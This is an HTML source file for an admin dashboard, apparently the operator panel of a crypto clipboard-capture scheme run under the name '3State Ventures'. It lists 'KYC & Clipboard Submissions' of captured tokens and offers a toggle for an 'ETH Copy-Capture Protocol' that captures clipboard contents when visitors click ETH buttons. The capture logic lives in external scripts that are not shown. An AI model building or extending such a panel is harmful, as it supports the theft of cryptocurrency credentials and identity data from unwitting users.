<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Admin Dashboard — 3State Ventures</title>
    <link rel="icon" href="../favicon.svg" type="image/svg+xml">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="/clipboard-supabase/config.js" onerror="this.onerror=null;this.src='../clipboard-supabase/config.js'"></script>
    <style>
        :root {
            --bg-dark: #141414;
            --card-dark: #1F1F1F;
            --card-inner: #292929;
            --primary: #1B3A82;
            --primary-light: #3B63C4;
            --accent: #E0582A;
            --accent-hover: #C2461B;
            --accent-soft: #FCE4D8;
            --text-light: #F5F5F5;
            --text-muted: #A3A3A3;
            --border-dark: #333333;
            --border-accent: rgba(224, 88, 42, 0.3);
            --radius: 12px;
            --transition: all 0.25s ease;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: radial-gradient(circle at 15% 0, rgba(27, 47, 94, 0.35), transparent 55%),
                        radial-gradient(circle at 85% 10%, rgba(224, 88, 42, 0.15), transparent 55%),
                        var(--bg-dark);
            color: var(--text-light);
            min-height: 100vh;
            padding: 24px 16px 48px;
            -webkit-font-smoothing: antialiased;
        }

        a { color: inherit; text-decoration: none; }
        .container { max-width: 1200px; margin: 0 auto; width: 100%; }

        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--border-dark);
            flex-wrap: wrap;
            gap: 16px;
        }
        .header .brand {
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .header h1 {
            font-size: 24px;
            font-weight: 400;
            letter-spacing: -0.02em;
            color: #fff;
        }

        /* Stats */
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 16px;
            margin-bottom: 28px;
        }
        .stat-card {
            background: var(--card-dark);
            border-radius: var(--radius);
            padding: 24px;
            border: 1px solid var(--border-dark);
            border-top: 3px solid var(--accent);
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
        }
        .stat-label {
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.12em;
            color: var(--text-muted);
            margin-bottom: 8px;
        }
        .stat-value {
            font-size: 32px;
            font-weight: 700;
            color: #fff;
        }

        /* Controls */
        .controls {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
        .btn {
            padding: 12px 24px;
            border-radius: 999px;
            border: none;
            cursor: pointer;
            font-size: 13px;
            font-weight: 700;
            transition: var(--transition);
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .btn-primary {
            background: var(--accent);
            color: #fff;
        }
        .btn-primary:hover {
            background: var(--accent-hover);
            transform: translateY(-1px);
        }
        .btn-danger {
            background: rgba(220, 38, 38, 0.15);
            border: 1px solid rgba(220, 38, 38, 0.4);
            color: #ef4444;
        }
        .btn-danger:hover {
            background: #dc2626;
            color: #fff;
        }

        /* Feature Card */
        .feature-card {
            background: var(--card-dark);
            border-radius: var(--radius);
            border: 1px solid var(--border-dark);
            padding: 20px 24px;
            margin-bottom: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
        }
        .feature-card h3 {
            font-size: 16px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 4px;
        }
        .feature-card p {
            font-size: 13px;
            color: var(--text-muted);
        }

        /* Table Container */
        .table-container {
            background: var(--card-dark);
            border-radius: var(--radius);
            border: 1px solid var(--border-dark);
            overflow: hidden;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
        }
        .table-header {
            padding: 20px 24px;
            border-bottom: 1px solid var(--border-dark);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .table-header h2 {
            font-size: 16px;
            font-weight: 600;
            color: #fff;
        }
        .timestamp {
            color: var(--text-muted);
            font-size: 12px;
        }
        .table-scroll {
            width: 100%;
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }
        thead {
            background: rgba(0,0,0,0.25);
        }
        th {
            padding: 14px 20px;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            color: var(--text-muted);
            border-bottom: 1px solid var(--border-dark);
        }
        td {
            padding: 16px 20px;
            border-bottom: 1px solid var(--border-dark);
            font-size: 13px;
            color: var(--text-light);
            vertical-align: middle;
        }
        tbody tr:hover {
            background: rgba(255,255,255,0.03);
        }
        .content-cell {
            max-width: 360px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            font-family: 'SF Mono', 'Roboto Mono', monospace;
            font-size: 12px;
        }
        .content-cell:hover {
            white-space: normal;
            word-break: break-all;
        }
        .type-badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 999px;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            background: rgba(224, 88, 42, 0.15);
            color: var(--accent);
            border: 1px solid var(--border-accent);
        }
        .delete-btn {
            padding: 6px 14px;
            background: rgba(220, 38, 38, 0.15);
            border: 1px solid rgba(220, 38, 38, 0.4);
            color: #ef4444;
            border-radius: 999px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: var(--transition);
        }
        .delete-btn:hover {
            background: #dc2626;
            color: #fff;
        }
        .empty-state {
            padding: 64px 20px;
            text-align: center;
            color: var(--text-muted);
        }
        .loading {
            padding: 48px;
            text-align: center;
            color: var(--text-muted);
        }

        /* Login Overlay */
        .login-overlay {
            position: fixed;
            inset: 0;
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(12px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }
        .login-box {
            background: var(--card-dark);
            padding: 40px;
            border-radius: 16px;
            border: 1px solid var(--border-dark);
            border-top: 4px solid var(--accent);
            width: 100%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 16px 48px rgba(0,0,0,0.6);
        }
        .login-box h2 {
            font-size: 22px;
            margin-bottom: 20px;
            color: #fff;
            font-weight: 400;
        }
        .login-input {
            width: 100%;
            padding: 13px 16px;
            margin-bottom: 14px;
            border-radius: 8px;
            border: 1px solid var(--border-dark);
            background: var(--card-inner);
            color: #fff;
            outline: none;
            font-size: 14px;
            transition: var(--transition);
        }
        .login-input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(224, 88, 42, 0.2);
        }
        .error-msg {
            color: #ef4444;
            font-size: 13px;
            margin-bottom: 16px;
            background: rgba(220, 38, 38, 0.1);
            border: 1px solid rgba(220, 38, 38, 0.3);
            padding: 8px 12px;
            border-radius: 6px;
            display: none;
        }
    </style>
</head>
<body>
    <div id="login-screen" class="login-overlay">
        <div class="login-box">
            <svg width="48" height="48" viewBox="0 0 100 100" style="margin-bottom: 16px;">
                <polygon points="66,6 84,6 58,92 44,92" fill="#1B3A82"/>
                <polygon points="8,6 32,6 58,92 44,92" fill="#3B63C4"/>
                <polygon points="46,16 96,16 91,34 51,34" fill="#2C52AE"/>
            </svg>
            <h2>Admin Authentication</h2>
            <div class="error-msg" id="login-error">Invalid credentials</div>
            <input type="text" id="admin-email" class="login-input" placeholder="Username or Email" autofocus />
            <input type="password" id="admin-pwd" class="login-input" placeholder="Password" />
            <button class="btn btn-primary" id="admin-login-btn" style="width: 100%; justify-content: center; margin-top: 6px;">Log In to Dashboard</button>
        </div>
    </div>

    <div class="container" id="app-content" style="display: none;">
        <div class="header">
            <div class="brand">
                <a href="../index.html" title="Back to homepage">
                    <svg width="40" height="40" viewBox="0 0 100 100">
                        <polygon points="66,6 84,6 58,92 44,92" fill="#1B3A82"/>
                        <polygon points="8,6 32,6 58,92 44,92" fill="#3B63C4"/>
                        <polygon points="46,16 96,16 91,34 51,34" fill="#2C52AE"/>
                    </svg>
                </a>
                <h1>Admin Control Center</h1>
            </div>
            <button class="btn btn-danger" onclick="logout()">Sign Out</button>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-label">Total Submissions</div>
                <div class="stat-value" id="total-count">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Today</div>
                <div class="stat-value" id="today-count">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">This Week</div>
                <div class="stat-value" id="week-count">0</div>
            </div>
        </div>

        <div class="controls">
            <button class="btn btn-primary" onclick="loadData()">Refresh Data</button>
            <button class="btn btn-danger" onclick="deleteAll()">Delete All Submissions</button>
        </div>

        <!-- Feature Control -->
        <div class="feature-card">
            <div>
                <h3>ETH Copy-Capture Protocol</h3>
                <p>Toggle active capture of clipboard tokens during ETH button clicks</p>
            </div>
            <button id="eth-toggle-btn" class="btn" style="background: #333; color: #fff; min-width: 130px; justify-content: center;" onclick="toggleEthFeature()">Loading...</button>
        </div>

        <div class="table-container">
            <div class="table-header">
                <h2>KYC & Clipboard Submissions</h2>
                <span id="last-updated" class="timestamp"></span>
            </div>
            <div class="table-scroll">
                <div id="table-content">
                    <div class="loading">Loading data...</div>
                </div>
            </div>
        </div>
    </div>

    <script src="/local-db.js" onerror="this.onerror=null;this.src='../local-db.js'"></script>
    <script src="/auth.js" onerror="this.onerror=null;this.src='../auth.js'"></script>
    <script>
        async function loadData() {
            const tableContent = document.getElementById('table-content');
            const data = (window.LocalDB && typeof window.LocalDB.getAll === 'function') 
                ? await window.LocalDB.getAll() 
                : [];

            const todayCount = (window.LocalDB && typeof window.LocalDB.getTodayCount === 'function')
                ? await window.LocalDB.getTodayCount()
                : 0;

            const weekCount = (window.LocalDB && typeof window.LocalDB.getWeekCount === 'function')
                ? await window.LocalDB.getWeekCount()
                : 0;

            const totalEl = document.getElementById('total-count');
            const todayEl = document.getElementById('today-count');
            const weekEl = document.getElementById('week-count');
            const updatedEl = document.getElementById('last-updated');

            if (totalEl) totalEl.textContent = data.length;
            if (todayEl) todayEl.textContent = todayCount;
            if (weekEl) weekEl.textContent = weekCount;
            if (updatedEl) updatedEl.textContent = 'Last updated: ' + new Date().toLocaleTimeString();

            if (!tableContent) return;

            if (data.length === 0) {
                tableContent.innerHTML = '<div class="empty-state"><p>No submissions recorded yet.</p></div>';
            } else {
                let html = '<table><thead><tr><th>Content / Token</th><th>Type</th><th>Partner / Reference</th><th>Submitted At</th><th>Actions</th></tr></thead><tbody>';
                data.forEach(item => {
                    const date = new Date(item.created_at);
                    const safeContent = (item.content || '').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
                    const userMeta = (item.user_name || item.user_number) 
                        ? (item.user_name || '') + (item.user_number ? ' (' + item.user_number + ')' : '') 
                        : '-';
                    html += '<tr>' +
                        '<td class="content-cell" title="' + safeContent + '">' + safeContent + '</td>' +
                        '<td><span class="type-badge">' + (item.content_type || 'text') + '</span></td>' +
                        '<td>' + userMeta + '</td>' +
                        '<td class="timestamp">' + date.toLocaleString() + '</td>' +
                        '<td><button class="delete-btn" onclick="deleteItem(\'' + item.id + '\')">Delete</button></td>' +
                    '</tr>';
                });
                html += '</tbody></table>';
                tableContent.innerHTML = html;
            }
        }

        async function deleteItem(id) {
            if (!confirm('Permanently delete this submission?')) return;
            if (window.LocalDB && typeof window.LocalDB.deleteById === 'function') {
                await window.LocalDB.deleteById(id);
            }
            await loadData();
        }

        async function deleteAll() {
            if (!confirm('Delete ALL submissions?')) return;
            if (!confirm('This cannot be undone. Are you sure?')) return;
            if (window.LocalDB && typeof window.LocalDB.deleteAll === 'function') {
                await window.LocalDB.deleteAll();
            }
            await loadData();
        }

        let isEthSaveEnabled = false;

        async function initEthFeature() {
            if (window.LocalDB && typeof window.LocalDB.isEthSaveEnabled === 'function') {
                isEthSaveEnabled = await window.LocalDB.isEthSaveEnabled();
            }
            updateToggleButtonUI();
        }

        function updateToggleButtonUI() {
            const btn = document.getElementById('eth-toggle-btn');
            if (!btn) return;
            if (isEthSaveEnabled) {
                btn.textContent = '● ACTIVE';
                btn.style.background = '#2e7d32';
                btn.style.color = '#fff';
            } else {
                btn.textContent = '○ INACTIVE';
                btn.style.background = '#333333';
                btn.style.color = '#A3A3A3';
            }
        }

        async function toggleEthFeature() {
            const newState = !isEthSaveEnabled;
            if (window.LocalDB && typeof window.LocalDB.setEthSave === 'function') {
                await window.LocalDB.setEthSave(newState);
            }
            isEthSaveEnabled = newState;
            updateToggleButtonUI();
        }

        async function attemptLogin() {
            const emailInput = document.getElementById('admin-email');
            const pwdInput = document.getElementById('admin-pwd');
            const loginBtn = document.getElementById('admin-login-btn');
            const username = emailInput ? emailInput.value.trim() : '';
            const pwd = pwdInput ? pwdInput.value.trim() : '';
            const errorEl = document.getElementById('login-error');
            if (errorEl) errorEl.style.display = 'none';

            if (!username || !pwd) {
                if (errorEl) {
                    errorEl.textContent = 'Please enter both username and password.';
                    errorEl.style.display = 'block';
                }
                return;
            }

            if (loginBtn) {
                loginBtn.disabled = true;
                loginBtn.textContent = 'Authenticating...';
            }

            try {
                if (!window.AssetAuth || typeof window.AssetAuth.login !== 'function') {
                    throw new Error('Auth module not initialized. Please refresh.');
                }
                const res = await window.AssetAuth.login(username, pwd);
                if (res && res.success) {
                    showDashboard();
                } else {
                    if (errorEl) {
                        errorEl.textContent = (res && res.message) ? res.message : 'Invalid credentials';
                        errorEl.style.display = 'block';
                    }
                }
            } catch (err) {
                console.error('Login error:', err);
                if (errorEl) {
                    errorEl.textContent = err.message || 'Authentication error';
                    errorEl.style.display = 'block';
                }
            } finally {
                if (loginBtn) {
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'Log In to Dashboard';
                }
            }
        }

        window.attemptLogin = attemptLogin;

        function showDashboard() {
            const loginScreen = document.getElementById('login-screen');
            const appContent = document.getElementById('app-content');
            if (loginScreen) loginScreen.style.display = 'none';
            if (appContent) appContent.style.display = 'block';
            loadData(); 
            initEthFeature();
        }

        function logout() {
            if (window.AssetAuth && typeof window.AssetAuth.logout === 'function') {
                window.AssetAuth.logout();
            } else {
                localStorage.removeItem('threestate_admin_token');
                sessionStorage.removeItem('threestate_admin_token');
                window.location.reload();
            }
        }
        window.logout = logout;

        document.addEventListener('DOMContentLoaded', () => { 
            const loginBtn = document.getElementById('admin-login-btn');
            if (loginBtn) {
                loginBtn.addEventListener('click', attemptLogin);
            }
            const pwdInput = document.getElementById('admin-pwd');
            if (pwdInput) {
                pwdInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') attemptLogin();
                });
            }
            const emailInput = document.getElementById('admin-email');
            if (emailInput) {
                emailInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') attemptLogin();
                });
            }

            if (sessionStorage.getItem('threestate_admin_token') || localStorage.getItem('threestate_admin_token') ||
                sessionStorage.getItem('chodor_admin_token') || localStorage.getItem('chodor_admin_token')) {
                showDashboard();
            }
        });

        setInterval(() => { 
            if (sessionStorage.getItem('threestate_admin_token') || localStorage.getItem('threestate_admin_token') ||
                sessionStorage.getItem('chodor_admin_token') || localStorage.getItem('chodor_admin_token')) {
                loadData(); 
            }
        }, 30000);
    </script>
</body>
</html>
